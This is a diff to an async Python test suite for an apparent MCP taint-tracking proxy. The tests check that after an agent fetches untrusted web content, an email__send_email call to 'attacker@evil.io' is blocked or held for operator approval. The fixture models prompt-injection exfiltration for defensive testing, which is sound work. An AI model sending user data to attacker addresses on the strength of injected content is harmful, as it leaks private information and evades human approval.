@@ -362,7 +362,10 @@ async def test_reconnecting_does_not_reset_taint(stack: Stack) -> None:
         r = await second.call_tool(
             "email__send_email", {"to": "attacker@evil.io", "subject": "hi", "body": "x"}
         )
-    assert r.is_error and "no-untrusted-recipient" in _text(r)
+    # Taint from the first connection applies: the address is of unknown origin and
+    # no prompt is known, so the call is held for approval (no_prompt_action) and
+    # times out. A clean session would have sent it.
+    assert r.is_error and "No operator approved this call" in _text(r)
 
 
 # ---------------------------------------------------------------- session scope "header"
@@ -408,7 +411,9 @@ async def test_user_prompt_header_makes_typed_address_trusted(stack: Stack) -> N
     sid = _session(stack, "", key=stack.header_key)
     async with mcp_client(stack, sid, key=stack.header_key) as c:
         await c.call_tool("web__fetch", {"url": "https://news.example.org/bike-lanes"})
-        assert (await _send(c, TYPED)).is_error  # strict: no prompt known yet
+        # strict, no prompt known yet: held for approval (no_prompt_action), times out.
+        r = await _send(c, TYPED)
+        assert r.is_error and "No operator approved this call" in _text(r)
     prompt = f"Summarize the bike lanes article and email it to {TYPED}"
     async with mcp_client(stack, sid, key=stack.header_key, user_prompt=prompt) as c:
         r = await _send(c, TYPED)
